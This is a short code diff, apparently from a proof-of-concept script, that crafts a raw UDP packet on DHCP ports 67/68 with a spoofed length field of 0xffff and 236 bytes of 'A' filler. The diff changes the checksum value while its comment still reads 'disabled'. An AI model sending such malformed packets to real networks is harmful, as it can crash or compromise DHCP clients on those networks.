@@ -92,7 +92,7 @@ payload = b''
 payload += pack([0x00, 67]) # SRC PORT
 payload += pack([0x00, 68]) # DST PORT
 payload += pack([0xff, 0xff]) # LENGTH (spoofed
-payload += pack([0x00, 0x00]) # Checksum (disabled)
+payload += pack([0x00, 0xf4]) # Checksum (disabled)
 payload += 'A'*236
 
 sendipv4(eth_src, eth_dst, eth_type, ip_src, ip_dst, ip_type, payload, iface)
